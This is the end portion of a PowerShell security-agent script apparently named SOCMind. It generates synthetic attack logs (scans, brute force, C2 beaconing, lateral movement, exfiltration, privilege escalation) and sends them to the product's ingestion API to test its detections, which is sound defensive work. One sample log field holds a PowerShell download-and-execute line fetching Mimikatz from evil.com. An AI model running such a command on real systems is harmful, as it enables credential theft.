            Write-Host "`nRecent Actions: $($actionLog.Count)" -ForegroundColor Cyan
            $actionLog | Select-Object -Last 5 | ForEach-Object {
                Write-Host "  [$($_.timestamp)] $($_.action_type) -> $($_.target) = $($_.status)" -ForegroundColor Gray
            }
        } catch {}
    }
    Write-Host ""
}

# ========== Attack Simulation ==========
function Invoke-AttackSimulation {
    param([string]$Scenario = "all")
    $cfg = Read-Config
    if (-not $cfg -or -not $cfg["api_key"] -or -not $cfg["api_endpoint"]) {
        Write-Host "[FATAL] Not configured. Run './socmind-agent-windows.ps1 configure' first." -ForegroundColor Red; return
    }
    $apiKey = $cfg["api_key"]; $apiEndpoint = $cfg["api_endpoint"]
    $attackerIP = "10.0.0.$(Get-Random -Minimum 50 -Maximum 254)"
    $targetIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
    if (-not $targetIP) { $targetIP = "192.168.1.$(Get-Random -Minimum 2 -Maximum 254)" }

    Write-Host ""
    Write-Host "============================================" -ForegroundColor Red
    Write-Host "  SOCMind ATTACK SIMULATOR" -ForegroundColor Red
    Write-Host "  Attacker IP: $attackerIP" -ForegroundColor Yellow
    Write-Host "  Target IP:   $targetIP" -ForegroundColor Yellow
    Write-Host "  Scenario:    $Scenario" -ForegroundColor Yellow
    Write-Host "============================================" -ForegroundColor Red
    Write-Host ""

    $allLogs = @()

    # === SCENARIO 1: Nmap Port Scan ===
    if ($Scenario -in @("all", "nmap", "portscan")) {
        Write-Host "[SIM] Generating Nmap Port Scan logs..." -ForegroundColor Magenta
        $ports = @(22, 80, 443, 445, 3389, 8080, 8443, 3306, 5432, 1433, 6379, 27017, 9200, 5900, 21)
        foreach ($port in $ports) {
            $allLogs += @{
                log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
                timestamp = (Get-Date).AddSeconds(-$(Get-Random -Minimum 1 -Maximum 30)).ToUniversalTime().ToString("o")
                message = "TCP SYN scan detected: $attackerIP -> ${targetIP}:$port (SYN-ACK response)"
                severity = 4; event_type = "port_scan"
                event_id = "5156"; mitre_tactic = "Discovery"; mitre_technique = "T1046"
                raw_log = @{ src_ip = $attackerIP; dst_ip = $targetIP; dst_port = $port; protocol = "TCP"; flags = "SYN"; scanner = "nmap" }
            }
        }
        # OS detection attempt
        $allLogs += @{
            log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
            timestamp = (Get-Date).AddSeconds(-1).ToUniversalTime().ToString("o")
            message = "OS fingerprinting attempt detected from $attackerIP - multiple probe packets with unusual TTL/window combinations"
            severity = 4; event_type = "reconnaissance"
            event_id = "5156"; mitre_tactic = "Discovery"; mitre_technique = "T1046"
            raw_log = @{ src_ip = $attackerIP; technique = "OS_fingerprint"; probes = 15 }
        }
        Write-Host "  [+] $($ports.Count + 1) port scan events generated" -ForegroundColor Yellow
    }

    # === SCENARIO 2: SSH/RDP Brute Force ===
    if ($Scenario -in @("all", "bruteforce", "brute")) {
        Write-Host "[SIM] Generating Brute Force Attack logs..." -ForegroundColor Magenta
        $users = @("administrator", "admin", "root", "user", "test", "guest", "backup", "service", "sa", "postgres")
        foreach ($user in $users) {
            for ($i = 0; $i -lt 5; $i++) {
                $allLogs += @{
                    log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
                    timestamp = (Get-Date).AddSeconds(-$(Get-Random -Minimum 1 -Maximum 120)).ToUniversalTime().ToString("o")
                    message = "Logon failure: Account '$user' from $attackerIP - Invalid credentials (attempt $($i+1))"
                    severity = 4; event_type = "brute_force"
                    event_id = "4625"; mitre_tactic = "Credential Access"; mitre_technique = "T1110"
                    raw_log = @{ src_ip = $attackerIP; username = $user; logon_type = 10; failure_reason = "Bad password"; attempt = $i+1 }
                }
            }
        }
        # Successful login after brute force
        $allLogs += @{
            log_type = "security"; source_ip = $attackerIP; dst_ip = $targetIP
            timestamp = (Get-Date).ToUniversalTime().ToString("o")
            message = "SUCCESSFUL LOGON after multiple failures: Account 'administrator' from $attackerIP via RDP"
            severity = 5; event_type = "suspicious_login"
            event_id = "4624"; mitre_tactic = "Initial Access"; mitre_technique = "T1078"
            raw_log = @{ src_ip = $attackerIP; username = "administrator"; logon_type = 10; after_failures = 50 }
        }
        Write-Host "  [+] $($users.Count * 5 + 1) brute force events generated" -ForegroundColor Yellow
    }

    # === SCENARIO 3: C2 Beaconing ===
    if ($Scenario -in @("all", "c2", "beacon")) {
        Write-Host "[SIM] Generating C2 Beaconing logs..." -ForegroundColor Magenta
        $c2Server = "185.$(Get-Random -Min 100 -Max 255).$(Get-Random -Min 1 -Max 255).$(Get-Random -Min 1 -Max 255)"
        $c2Domain = "update-service-$(Get-Random -Min 1000 -Max 9999).xyz"
        for ($i = 0; $i -lt 20; $i++) {
            $allLogs += @{
                log_type = "security"; source_ip = $targetIP; dst_ip = $c2Server
                timestamp = (Get-Date).AddSeconds(-($i * 30)).ToUniversalTime().ToString("o")
                message = "Periodic outbound connection: ${targetIP} -> ${c2Server}:443 every ~30s (beacon pattern detected) - Domain: $c2Domain"
                severity = 5; event_type = "c2_communication"
                event_id = "5156"; mitre_tactic = "Command and Control"; mitre_technique = "T1071"
                raw_log = @{ src_ip = $targetIP; dst_ip = $c2Server; dst_port = 443; interval_seconds = 30; domain = $c2Domain; bytes_out = Get-Random -Min 64 -Max 512; bytes_in = Get-Random -Min 128 -Max 4096 }
            }
        }
        # DNS tunnel attempt
        $allLogs += @{
            log_type = "security"; source_ip = $targetIP; dst_ip = "8.8.8.8"
            timestamp = (Get-Date).ToUniversalTime().ToString("o")
            message = "Suspicious DNS query: Long subdomain encoding detected - $(Get-Random -Min 100000 -Max 999999).data.$c2Domain (possible DNS tunneling)"
            severity = 5; event_type = "dns_tunneling"
            event_id = "5156"; mitre_tactic = "Command and Control"; mitre_technique = "T1071.004"
            raw_log = @{ query = "$(Get-Random).data.$c2Domain"; query_length = 85; type = "TXT" }
        }
        Write-Host "  [+] 21 C2/beacon events generated" -ForegroundColor Yellow
    }

    # === SCENARIO 4: Lateral Movement ===
    if ($Scenario -in @("all", "lateral")) {
        Write-Host "[SIM] Generating Lateral Movement logs..." -ForegroundColor Magenta
        $internalTargets = @("192.168.1.10", "192.168.1.20", "192.168.1.30", "192.168.1.50", "192.168.1.100")
        foreach ($t in $internalTargets) {
            $allLogs += @{
                log_type = "security"; source_ip = $attackerIP; dst_ip = $t
                timestamp = (Get-Date).AddSeconds(-$(Get-Random -Min 1 -Max 60)).ToUniversalTime().ToString("o")
                message = "SMB/ADMIN$ access from compromised host $attackerIP to $t - PsExec-style lateral movement"
                severity = 5; event_type = "lateral_movement"
                event_id = "5140"; mitre_tactic = "Lateral Movement"; mitre_technique = "T1021.002"
                raw_log = @{ src_ip = $attackerIP; dst_ip = $t; share = "ADMIN$"; tool = "PsExec" }
            }
        }
        Write-Host "  [+] $($internalTargets.Count) lateral movement events generated" -ForegroundColor Yellow
    }

    # === SCENARIO 5: Data Exfiltration ===
    if ($Scenario -in @("all", "exfil", "exfiltration")) {
        Write-Host "[SIM] Generating Data Exfiltration logs..." -ForegroundColor Magenta
        $exfilServer = "103.$(Get-Random -Min 1 -Max 255).$(Get-Random -Min 1 -Max 255).$(Get-Random -Min 1 -Max 255)"
        for ($i = 0; $i -lt 5; $i++) {
            $size = Get-Random -Min 50 -Max 500
            $allLogs += @{
                log_type = "security"; source_ip = $targetIP; dst_ip = $exfilServer
                timestamp = (Get-Date).AddSeconds(-($i * 10)).ToUniversalTime().ToString("o")
                message = "Large outbound data transfer: ${targetIP} -> ${exfilServer}:443 - ${size}MB transferred (abnormal volume)"
                severity = 5; event_type = "data_exfiltration"
                event_id = "5156"; mitre_tactic = "Exfiltration"; mitre_technique = "T1041"
                raw_log = @{ src_ip = $targetIP; dst_ip = $exfilServer; bytes_out = $size * 1048576; protocol = "HTTPS" }
            }
        }
        Write-Host "  [+] 5 exfiltration events generated" -ForegroundColor Yellow
    }

    # === SCENARIO 6: Privilege Escalation ===
    if ($Scenario -in @("all", "privesc")) {
        Write-Host "[SIM] Generating Privilege Escalation logs..." -ForegroundColor Magenta
        $allLogs += @{
            log_type = "security"; source_ip = $targetIP
            timestamp = (Get-Date).AddSeconds(-5).ToUniversalTime().ToString("o")
            message = "New service installed: 'SOCMindTest_Svc' running as SYSTEM - Suspicious binary path: C:\Temp\payload.exe"
            severity = 5; event_type = "privilege_escalation"
            event_id = "4697"; mitre_tactic = "Privilege Escalation"; mitre_technique = "T1543.003"
            raw_log = @{ service_name = "SOCMindTest_Svc"; binary = "C:\Temp\payload.exe"; account = "LocalSystem" }
        }
        $allLogs += @{
            log_type = "security"; source_ip = $targetIP
            timestamp = (Get-Date).AddSeconds(-3).ToUniversalTime().ToString("o")
            message = "User 'attacker' added to Administrators group by process running as SYSTEM"
            severity = 5; event_type = "privilege_escalation"
            event_id = "4732"; mitre_tactic = "Persistence"; mitre_technique = "T1098"
            raw_log = @{ username = "attacker"; group = "Administrators"; added_by = "SYSTEM" }
        }
        $allLogs += @{
            log_type = "security"; source_ip = $targetIP
            timestamp = (Get-Date).ToUniversalTime().ToString("o")
            message = "Suspicious PowerShell execution: Invoke-Mimikatz detected - credential dumping attempt"
            severity = 5; event_type = "credential_dumping"
            event_id = "4688"; mitre_tactic = "Credential Access"; mitre_technique = "T1003"
            raw_log = @{ process = "powershell.exe"; cmdline = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mimikatz.ps1')"; parent = "cmd.exe" }
        }
        Write-Host "  [+] 3 privilege escalation events generated" -ForegroundColor Yellow
    }

    Write-Host ""
    Write-Host "[TOTAL] $($allLogs.Count) attack events ready to send" -ForegroundColor Cyan

    # Send in batches of 10
    $batchSize = 10
    $sent = 0
    for ($i = 0; $i -lt $allLogs.Count; $i += $batchSize) {
        $batch = $allLogs[$i..([Math]::Min($i + $batchSize - 1, $allLogs.Count - 1))]
        $url = "$apiEndpoint/agent-gateway/ingest"
        $body = @{ logs = $batch } | ConvertTo-Json -Depth 10 -Compress
        try {
            $headers = @{ "Content-Type" = "application/json"; "X-Agent-Key" = $apiKey; "User-Agent" = "SOCMind-Agent-Windows/$($script:AgentVersion)" }
            $resp = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -TimeoutSec 60
            $sent += $batch.Count
            Write-Host "[SENT] Batch $([Math]::Floor($i/$batchSize)+1): $($batch.Count) logs -> $($resp.processed) processed, $($resp.incidents_created) incidents created" -ForegroundColor Green
        } catch {
            Write-Host "[ERR] Failed to send batch: $_" -ForegroundColor Red
        }
        Start-Sleep -Seconds 2
    }

    Write-Host ""
    Write-Host "============================================" -ForegroundColor Green
    Write-Host "  SIMULATION COMPLETE" -ForegroundColor Green
    Write-Host "  Total sent: $sent / $($allLogs.Count)" -ForegroundColor Green
    Write-Host "  Check the SOCMind Dashboard for incidents!" -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Green
    Write-Host ""
}

function Show-Help {
    Write-Host ""
    Write-Host "SOCMind Windows Agent v$($script:AgentVersion) - Universal Executor" -ForegroundColor Cyan
    Write-Host "=====================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Commands:" -ForegroundColor White
    Write-Host "  configure      - Set up API credentials and license" -ForegroundColor Gray
    Write-Host "  run            - Start agent (collect logs + execute actions)" -ForegroundColor Gray
    Write-Host "  run --dry-run  - Start in simulation mode (no real actions)" -ForegroundColor Gray
    Write-Host "  simulate       - Run ALL attack scenarios (nmap + brute force + C2 + lateral + exfil + privesc)" -ForegroundColor Gray
    Write-Host "  simulate nmap  - Simulate Nmap port scan only" -ForegroundColor Gray
    Write-Host "  simulate brute - Simulate brute force attack only" -ForegroundColor Gray
    Write-Host "  simulate c2    - Simulate C2 beaconing only" -ForegroundColor Gray
    Write-Host "  simulate lateral - Simulate lateral movement only" -ForegroundColor Gray
    Write-Host "  simulate exfil - Simulate data exfiltration only" -ForegroundColor Gray
    Write-Host "  simulate privesc - Simulate privilege escalation only" -ForegroundColor Gray
    Write-Host "  status         - Check agent status and recent actions" -ForegroundColor Gray
    Write-Host "  help           - Show this message" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Supported Actions:" -ForegroundColor White
    Write-Host "  block_ip, unblock_ip, kill_process, disable_user, enable_user" -ForegroundColor Gray
    Write-Host "  lock_account, reset_password, stop_service, start_service" -ForegroundColor Gray
    Write-Host "  quarantine_file, delete_file, isolate_host, unisolate_host" -ForegroundColor Gray
    Write-Host "  show_warning" -ForegroundColor Gray
    Write-Host ""
}

# ========== Main ==========
switch ($Command.ToLower()) {
    "configure" { Invoke-Configure }
    "run"       {
        $isDryRun = $args -contains "--dry-run"
        Invoke-Run -DryRun:$isDryRun
    }
    "start"     { Invoke-Run }
    "simulate"  {
        $scenario = if ($args.Count -gt 0) { $args[0] } else { "all" }
        Invoke-AttackSimulation -Scenario $scenario
    }
    "status"    { Show-Status }
    "help"      { Show-Help }
    default     { Show-Help }
}
